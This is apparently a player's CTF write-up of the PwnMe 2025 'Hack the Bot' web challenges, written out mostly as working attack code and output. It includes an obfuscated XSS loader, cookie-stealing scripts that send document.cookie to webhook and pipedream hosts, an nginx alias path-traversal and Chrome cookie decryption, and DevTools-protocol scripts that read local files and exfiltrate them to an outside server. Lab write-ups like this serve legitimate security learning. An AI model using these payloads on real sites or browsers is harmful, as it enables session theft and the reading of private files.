#### Other Ways to Solve

##### Script SRC

My idea was to add a `script` element to the end of the document and to have a custom `src` that allowed any script to be executed from our own domain, instead of filtering a script each time.

I ended up making this payload:

```js
<input onfocusin="eval('vara'.substr(0,3)+' '+'llasa'.substr(0,4)+'='+'docua'.substr(0,4)+'ment.vv'.substr(0,5)+'creav'.substr(0,4)+'vtev'.substr(1,2)+eval('\'\\xa'.substr(0,3)+'45'+'\'')+'laa'.substr(0,1)+'ementa'.substr(0,5)+'(\'scvv'.substr(0,4)+'riv'.substr(0,2)+'ptvv'.substr(0,2)+'\'qq'.substr(0,1)+')'+';llas.svv'.substr(0,7)+'ara'.substr(1,1)+'aca'.substr(1,1)+'vv=vv'.substr(2,1)+'zxz\'//zxz'.substr(3,3)+'afil'.substr(1,3)+'vesv'.substr(1,2)+'.'.substr(0,1)+'vseallv'.substr(1,5)+'.'.substr(0,1)+'vvdev/bvv'.substr(2,5)+'\';'+'docum'+'aaent.'.substr(2,4)+'boa'.substr(0,2)+'dy'+'.'.substr(0,1)+'vapv'.substr(1,2)+'pend'+'(llas);')" autofocus>
```

This (in readable form) is this:

```js
var llas = document.createElement("script");
llas.src = "//files.seall.dev/b";
document.body.append(llas);
```

It's just grabbing a file from my GitHub Pages site, and executing it as JavaScript.

The contents of which was:

```js
(function checkCookiesAndSendRequest() {
  if (document.cookie !== "") {
    fetch(`http://WEBHOOK/?cookies=${btoa(document.cookie)}`)
      .then((response) => response.text())
      .then((data) => console.log("sent!"))
      .catch((error) => console.error("Error:", error));
  } else {
    setTimeout(checkCookiesAndSendRequest, 100);
  }
})();
```

This then exfiltrates the cookies.

##### iFrame SRCDOC

This was another solution by another player:

```html
http://localhost/?q=<iframe
  srcdoc="%26%2360;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;%26%23115;%26%23101;%26%23116;%26%2384;%26%23105;%26%23109;%26%23101;%26%23111;%26%23117;%26%23116;%26%2340;%26%2340;%26%2340;%26%2341;%26%2332;%26%2361;%26%2362;%26%2332;%26%23123;%26%23108;%26%23111;%26%2399;%26%2397;%26%23116;%26%23105;%26%23111;%26%23110;%26%2361;%26%2339;%26%23104;%26%23116;%26%23116;%26%23112;%26%23115;%26%2358;%26%2347;%26%2347;%26%23101;%26%23111;%26%2353;%26%23102;%26%2348;%26%23113;%26%23104;%26%2397;%26%23102;%26%23117;%26%2353;%26%23120;%26%2353;%26%2348;%26%23107;%26%2346;%26%23109;%26%2346;%26%23112;%26%23105;%26%23112;%26%23101;%26%23100;%26%23114;%26%23101;%26%2397;%26%23109;%26%2346;%26%23110;%26%23101;%26%23116;%26%2347;%26%2339;%26%2343;%26%23100;%26%23111;%26%2399;%26%23117;%26%23109;%26%23101;%26%23110;%26%23116;%26%2346;%26%2399;%26%23111;%26%23111;%26%23107;%26%23105;%26%23101;%26%23125;%26%2341;%26%2344;%26%2332;%26%2349;%26%2348;%26%2348;%26%2348;%26%2341;%26%2360;%26%2347;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;"
></iframe>
```

They used HTML escape codes inside an `iframe`'s `srcdoc` to run the following:

```js
<script>
  setTimeout((() =>{" "}
  {(location = "https://eo5f0qhafu5x50k.m.pipedream.net/" + document.cookie)}),
  1000)
</script>
```

Which then exfiltrated the cookie!

##### Nginx Shenanigans

Full credit to Discord user `minilucker` for this solve.

Pulling out the browser cookies from the Puppeteer cache you can decrypt them for the flag.

Firstly send a report to the URL `http://localhost/` to initialise the cookies in the browser cache.

Then visit `http://localhost/logs../browser_cache/Default/Cookies` to download the Cookies file with a path traversal.

This occurs due to a misconfiguration in the nginx config:
```conf
events{}
user root;

http {
    server {
        listen 80;

        location / {
            proxy_pass http://127.0.0.1:5000;
        }

        location /logs {
            autoindex off;
            alias /tmp/bot_folder/logs/;
            try_files $uri $uri/ =404;
        }
    }
}
```

You can read more about the location misconfiguration [here](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) but it allows path traversal.

We can initialise the `Cookie` file with `sqlite3`:
```bash
$ sqlite3 Cookies
sqlite> select hex(encrypted_value) from cookies;
763130AB3A186C367663FCBA25263072C8B5BFAF15135690D33686A9C6A4D0EA0403DE
```

This can then be decrypted using a Python script
```python
#! /usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Function to get rid of padding
def clean(x): 
    return x[:-x[-1]].decode('utf8')

encrypted_value = bytes.fromhex("763130AB3A186C367663FCBA25263072C8B5BFAF15135690D33686A9C6A4D0EA0403DE") 

encrypted_value = encrypted_value[3:]

# Default values used by both Chrome and Chromium in OSX and Linux
salt = b'saltysalt'
iv = b' ' * 16
length = 16

# On Mac, replace MY_PASS with your password from Keychain
# On Linux, replace MY_PASS with 'peanuts'
my_pass = "peanuts"
my_pass = my_pass.encode('utf8')

# 1003 on Mac, 1 on Linux
iterations = 1

key = PBKDF2(my_pass, salt, length, iterations)
cipher = AES.new(key, AES.MODE_CBC, IV=iv)

decrypted = cipher.decrypt(encrypted_value)
print(clean(decrypted))
```

```bash
$ python3 script.py                                              
PWNME{FAKE_FLAG}
```

### Hack the Bot 2
> I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it?"

Note: This was a post-solve of the challenge!

This was a hard whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Hack_the_bot_). I had some issues with the Dockerfile and had to modify it to install the Chrome drivers properly.

#### Initial Look

The program is the same as the one described in the 'Initial Look' section of the [Hack the Bot 1](25-pwnmequals-hackthebot1) writeup.

This time the flag is stored in a folder, you can see it being moved in the `Dockerfile`:
```docker
...
COPY flag2.txt /root/
...
```

#### Nginx Misconfiguration

Looking at the `nginx` configuration file, there is an error:
```
events{}
user root;

http {
    server {
        listen 80;

        location / {
            proxy_pass http://127.0.0.1:5000;
        }

        location /logs {
            autoindex off;
            alias /tmp/bot_folder/logs/;
            try_files $uri $uri/ =404;
        }
    }
}
```

There are more details [here](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) but here is a brief summary.

Nginx `alias` is a replacement for the path specified in `location`, for example:
```
location /i/ {
    alias /data/w3/images/;
}
```

If I sent a request to `/i/example.txt` it is getting the file from `/data/w3/images/example.txt`.

Our configuration has the following (with some lines removed for brevity):
```
location /logs {
    alias /tmp/bot_folder/logs/;
}
```

Due to the lack of the closing `/` on `/logs`, we can achieve path traversal.

We can just read the flag now! `http://localhost/logs../../../root/flag2.txt`... Just kidding, we don't have permissions.

After a decent amount of poking around, I am shown Chrome DevTools Protocol!

#### Chrome DevTools Protocol

This is a websocket connection used with a path and port specified in `DevToolsActivePort` (which we can access with the nginx misconfiguration). It allows for alot of functionality which can be read up more on [here](https://chromedevtools.github.io/devtools-protocol/) but a few features caught my eye:

> Note: I couldn't get `Page` features working but I think that's because I was not on an active page yet with my commands, I'll outline further why later.

`Target` has some interesting capabilites such as:
- [`createTarget`](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-createTarget) - Creates a new page.
- [`attachToTarget](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-attachToTarget) - Attaches to the target with given id.

Once attached we can use `Runtime` features which seem very useful:
- [`enable`](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-enable) - Enables reporting of execution contexts creation by means of `executionContextCreated` event. When the reporting gets enabled the event will be sent immediately for each existing execution context.
- [`evaluate`](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate) - Evaluates expression on global object.

If we could create a terget to the `file:///` URI and then attach to that target, we could then utilise `Runtime.evaluate` to read the content of the page?

#### Starting small

Let's work on a basic payload just to connect to devtools:
```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    fetch(`${webhook}?${wsUrl}`);
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```

I then use my Script SRC payload from [Hack the Bot 1](25-pwnmequals-hackthebot1) to get the JS file, and report the link pointing to the JS payload.

We get a response on the webhook:
`/?ws://localhost:44629/devtools/browser/80e93e6f-0f0f-46ee-be2f-45e036a2afc8`

Woo!

#### Commands

I start with a command `createTarget` to initialise a file URI to the flag.

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    fetch(`${webhook}?received=${btoa(event.data)}`);
    ws.close();
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```

We get our responses!
```
GET /a HTTP/1.1
GET /?weclosed HTTP/1.1
GET /?openedWS HTTP/1.1
GET /?received=eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjQ0RDkzQjAxRDgzODNCOURBMzEzNjdGODE0MzhBMDQifX0= HTTP/1.1
```

Base64 decoding the recieved data:
```bash
$ echo "eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjQ0RDkzQjAxRDgzODNCOURBMzEzNjdGODE0MzhBMDQifX0=" | base64 -d
{"id":1,"result":{"targetId":"644D93B01D8383B9DA31367F81438A04"}}
```
Yay! We get a `targetId` and we can now use that for a `Target.attachToTarget`!

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    fetch(`${webhook}?received=${btoa(event.data)}`);
    
    if (data && data.id === 1 && data.result && data.result.targetId) {
      targetId = data.result.targetId;
      fetch(`${webhook}?gotTargetId=${targetId}`);
      
      const attachCommand = {
        id: 2,
        method: 'Target.attachToTarget',
        params: { 
          targetId: targetId,
          flatten: true
        }
      };
      ws.send(JSON.stringify(attachCommand));
    }

    if (data && data.id === 2) {
      ws.close();
    }
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```

We get a response:
```
GET /a HTTP/1.1
GET /?received=eyJpZCI6MiwicmVzdWx0Ijp7InNlc3Npb25JZCI6Ijk4NkVCQ0I4NjM1NTA5RkYxQUYzODVFQzY3NEUyMENBIn19 HTTP/1.1
GET /?gotTargetId=699F59AF8810559BCF735269079AAC78 HTTP/1.1
GET /?openedWS HTTP/1.1
GET /?received=eyJtZXRob2QiOiJUYXJnZXQuYXR0YWNoZWRUb1RhcmdldCIsInBhcmFtcyI6eyJzZXNzaW9uSWQiOiI5ODZFQkNCODYzNTUwOUZGMUFGMzg1RUM2NzRFMjBDQSIsInRhcmdldEluZm8iOnsidGFyZ2V0SWQiOiI2OTlGNTlBRjg4MTA1NTlCQ0Y3MzUyNjkwNzlBQUM3OCIsInR5cGUiOiJwYWdlIiwidGl0bGUiOiIiLCJ1cmwiOiJmaWxlOi8vL3Jvb3QvZmxhZzIudHh0IiwiYXR0YWNoZWQiOnRydWUsImNhbkFjY2Vzc09wZW5lciI6ZmFsc2UsImJyb3dzZXJDb250ZXh0SWQiOiI3RThFNDYyNkVCQjBBNUY3QkIzQkFBNEJCMUUxRTgxNCJ9LCJ3YWl0aW5nRm9yRGVidWdnZXIiOmZhbHNlfX0= HTTP/1.1
GET /?received=eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjk5RjU5QUY4ODEwNTU5QkNGNzM1MjY5MDc5QUFDNzgifX0= HTTP/1.1
GET /?weclosed HTTP/1.1
```

It's all out of order because asynchronous-y things, but we can decode the portions and get the following:
```bash
$ echo "eyJpZCI6MiwicmVzdWx0Ijp7InNlc3Npb25JZCI6Ijk4NkVCQ0I4NjM1NTA5RkYxQUYzODVFQzY3NEUyMENBIn19" | base64 -d                                                                                        
{"id":2,"result":{"sessionId":"986EBCB8635509FF1AF385EC674E20CA"}}
$ echo "eyJtZXRob2QiOiJUYXJnZXQuYXR0YWNoZWRUb1RhcmdldCIsInBhcmFtcyI6eyJzZXNzaW9uSWQiOiI5ODZFQkNCODYzNTUwOUZGMUFGMzg1RUM2NzRFMjBDQSIsInRhcmdldEluZm8iOnsidGFyZ2V0SWQiOiI2OTlGNTlBRjg4MTA1NTlCQ0Y3MzUyNjkwNzlBQUM3OCIsInR5cGUiOiJwYWdlIiwidGl0bGUiOiIiLCJ1cmwiOiJmaWxlOi8vL3Jvb3QvZmxhZzIudHh0IiwiYXR0YWNoZWQiOnRydWUsImNhbkFjY2Vzc09wZW5lciI6ZmFsc2UsImJyb3dzZXJDb250ZXh0SWQiOiI3RThFNDYyNkVCQjBBNUY3QkIzQkFBNEJCMUUxRTgxNCJ9LCJ3YWl0aW5nRm9yRGVidWdnZXIiOmZhbHNlfX0=" | base64 -d
{"method":"Target.attachedToTarget","params":{"sessionId":"986EBCB8635509FF1AF385EC674E20CA","targetInfo":{"targetId":"699F59AF8810559BCF735269079AAC78","type":"page","title":"","url":"file:///root/flag2.txt","attached":true,"canAccessOpener":false,"browserContextId":"7E8E4626EBB0A5F7BB3BAA4BB1E1E814"},"waitingForDebugger":false}}
$ echo "eyJpZCI6MSwicmVzdWx0Ijp7InRhcmdldElkIjoiNjk5RjU5QUY4ODEwNTU5QkNGNzM1MjY5MDc5QUFDNzgifX0=" | base64 -d
{"id":1,"result":{"targetId":"699F59AF8810559BCF735269079AAC78"}}
```

Yay things are working! In that second decoded string we can see that's the response to the `Target.attachToTarget`, and listed is `"attached":true`!

Let's move on to execution:

#### The fun!

This is the same payload as before, we are now adding on the following:
```js
...
    else if (data && data.id === 2 && data.result && data.result.sessionId) {
      const sessionId = data.result.sessionId;
      fetch(`${webhook}?gotSessionId=${sessionId}`);
      
      const enableRuntimeCommand = {
        id: 3,
        method: 'Runtime.enable',
        params: {},
        sessionId: sessionId
      };
      ws.send(JSON.stringify(enableRuntimeCommand));
    }

    else if (data && data.id === 3){
      ws.close();
    }
...
```

This will enable `Runtime` commands!

We get this new response: `{"id":3,"result":{},"sessionId":"3AE5046B90DE80963D8144DE14A75FAF"}`

I now use `evaluate` to get the page content!

```js
...
const evaluateCommand = {
  id: 4 + checkAttempts,
  method: 'Runtime.evaluate',
  params: {
    expression: 'document.documentElement.outerHTML',
    returnByValue: true
  },
  sessionId: sessionId
};
ws.send(JSON.stringify(evaluateCommand));
...
```

This *should* work fine, but it doesn't as page content takes time to load, so we need to continously check for the content in the HTML. We know the flag starts with `PWNME` so let's wait for that:
```js
...
else if (data && data.id === 2 && data.result && data.result.sessionId) {
  sessionId = data.result.sessionId;
  fetch(`${webhook}?gotSessionId=${sessionId}`);
  const enableRuntimeCommand = {
    id: 3,
    method: 'Runtime.enable',
    params: {},
    sessionId: sessionId
  };
  ws.send(JSON.stringify(enableRuntimeCommand));
  checkContent();
}
...
else if (data && data.id >= 4) {
  if (data.result && data.result.result && data.result.result.value) {
    const content = data.result.result.value;
    if (content.includes('PWNME')) {
      fetch(`${webhook}?found=PWNME&content=${btoa(content)}`);
      ws.close();
    } else  {
      setTimeout(checkContent, 1000);
    }
  } else {
    setTimeout(checkContent, 1000);
  }
}
...
function checkContent() {
  if (sessionId) {
    checkAttempts++;
    const evaluateCommand = {
      id: 4 + checkAttempts,
      method: 'Runtime.evaluate',
      params: {
        expression: 'document.documentElement.outerHTML',
        returnByValue: true
      },
      sessionId: sessionId
    };
    ws.send(JSON.stringify(evaluateCommand));
  }
}
...
```

So now it will setup this `checkContent()` function in the `enable` command, then check the content for the response, if it doesn't contain `PWNME` wait a second and go again until we find it!


#### The Solve!

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://server.blackmail.zip/`;
  ws = new WebSocket(wsUrl);
  let targetId = null;
  let sessionId = null;
  let checkAttempts = 0;

  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };

  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);    
    if (data && data.id === 1 && data.result && data.result.targetId) {
      targetId = data.result.targetId;
      fetch(`${webhook}?gotTargetId=${targetId}`);
      const attachCommand = {
        id: 2,
        method: 'Target.attachToTarget',
        params: {
          targetId: targetId,
          flatten: true
        }
      };
      ws.send(JSON.stringify(attachCommand));
    }
    else if (data && data.id === 2 && data.result && data.result.sessionId) {
      sessionId = data.result.sessionId;
      fetch(`${webhook}?gotSessionId=${sessionId}`);
      const enableRuntimeCommand = {
        id: 3,
        method: 'Runtime.enable',
        params: {},
        sessionId: sessionId
      };
      ws.send(JSON.stringify(enableRuntimeCommand));
    }
    else if (data && data.id >= 4) {
      if (data.result && data.result.result && data.result.result.value) {
        const content = data.result.result.value;
        if (content.includes('PWNME')) {
          fetch(`${webhook}?found=PWNME&content=${btoa(content)}`);
          ws.close();
        } else  {
          setTimeout(checkContent, 1000);
        }
      } else {
        setTimeout(checkContent, 1000);
      }
    }
  };

  function checkContent() {
    if (sessionId) {
      checkAttempts++;
      const evaluateCommand = {
        id: 4 + checkAttempts,
        method: 'Runtime.evaluate',
        params: {
          expression: 'document.documentElement.outerHTML',
          returnByValue: true
        },
        sessionId: sessionId
      };
      ws.send(JSON.stringify(evaluateCommand));
    }
  }

  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
})();
```

The response to the solve:
```
GET /a HTTP/1.1
GET /?openedWS HTTP/1.1
GET /?gotTargetId=E163C43EFF2F0BCC816058D3F1E11561 HTTP/1.1
GET /?gotSessionId=98047CDC4DEE1E748BA7CA2667C39C33 HTTP/1.1
GET /?found=PWNME&content=PGh0bWw+PGhlYWQ+PG1ldGEgbmFtZT0iY29sb3Itc2NoZW1lIiBjb250ZW50PSJsaWdodCBkYXJrIj48L2hlYWQ+PGJvZHk+PHByZSBzdHlsZT0id29yZC13cmFwOiBicmVhay13b3JkOyB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7Ij5QV05NRXtGQUtFX0ZMQUd9CjwvcHJlPjwvYm9keT48L2h0bWw+ HTTP/1.1
```

Flag: `PWNME{FAKE_FLAG_BECAUSE_THIS_IS_A_POSTSOLVE}`


#### Other Solutions

##### DOM

User `TechnologicNick` had a solve using `DOM`:

```js
...
devtools.onopen = () => {
        callback("Opened");

        devtools.send(JSON.stringify({
            id: 1,
            method: 'Target.createTarget',
            params: {
                url: "file:///root/flag2.txt",
            },
        }));
    };

    devtools.onerror = (err) => {
        console.error('WebSocket Error: ', err);
        callback("WebSocket Error: " + err);
    }

    devtools.onmessage = (event) => {
        // const {result: {result: {value}}} = JSON.parse(data);
        // console.log('WebSocket Message Received: ', value)
        callback("<-- " + event.data);
        const obj = JSON.parse(event.data);

        if (obj.id === 1 && sessionId === null) {
            const targetId = obj.result.targetId;

            devtools.send(JSON.stringify({
                id: 2,
                method: 'Target.attachToTarget',
                params: {
                    targetId,
                    flatten: true
                }
            }));
        } else if (obj.id === 2 && sessionId === null) {
            sessionId = obj.result.sessionId;

            devtools.send(JSON.stringify({
                sessionId,
                id: 3,
                method: 'DOM.getDocument',
            }));

            devtools.send(JSON.stringify({
                sessionId,
                id: 4,
                method: 'DOM.getOuterHTML',
                params: {"nodeId":1}
            }));

            // Wait for DOM.documentUpdated
            setTimeout(() => {
                devtools.send(JSON.stringify({
                    sessionId,
                    id: 5,
                    method: 'DOM.getDocument',
                }));
                devtools.send(JSON.stringify({
                    sessionId,
                    id: 6,
                    method: 'DOM.getOuterHTML',
                    params: {"nodeId":5}
                }))
            }, 1000);
        }

    };
```

They waited 1s for a DOM.documentUpdated and then retrieved the contents again with `DOM.getOuterHTML`!

##### Page and Evaluate
This clean solution by `aelmo` uses `Page` and `Evaluate` (which I could not get working myself):
```js
function connectPage(port, targetId, hook) {
  const ws = new WebSocket(`ws://localhost:${port}/devtools/page/${targetId}`);

  ws.onopen = () => {
    ws.send(
      JSON.stringify({
        id: 1,
        method: "Page.navigate",
        params: { url: "file:///root/flag2.txt" },
      })
    );

    fetch(hook + "connected");
  };

  ws.onmessage = (event) => {
    fetch(hook + "msg", { method: "POST", body: event.data });
    let data = JSON.parse(event.data);

    switch (data.id) {
      case 1:
        ws.send(
          JSON.stringify({
            id: 2,
            method: "Runtime.evaluate",
            params: { expression: "document.body.innerHTML" },
          })
        );
        break;
    }
  };
}
```

Just using a `Page.navigate` to direct, then evaluating the `innerHTML`.

##### RCE?

Player `jopraveen` has an [awesome writeup I suggest you read](https://jopraveen.github.io/web-hackthebot/) that solved both [Hack the Bot 1](25-pwnmequals-hackthebot1) and this challenge using an n-day in outdated Chrome to get RCE!

## Thanks for reading!
Thank you to the authors for this CTF, legitimately one of the best CTFs I've played.

Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev) and [LinkedIn](https://www.linkedin.com/in/noah-cooper-5442ab309/).

You can also find my other contacts on the [whoami](../about) page.
